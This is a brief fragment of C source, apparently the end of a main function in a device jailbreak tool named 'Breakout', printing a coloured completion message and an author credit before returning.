	printf("%s [*] Breakout is complete, you should now have a fully working jailbreak! Enjoy!%s\n", KGRN, KNRM);
	printf("%s [*] Breakout was written by DarkMalloc et. al.%s\n\n", KGRN, KNRM);
	
	return 0;
	
	
}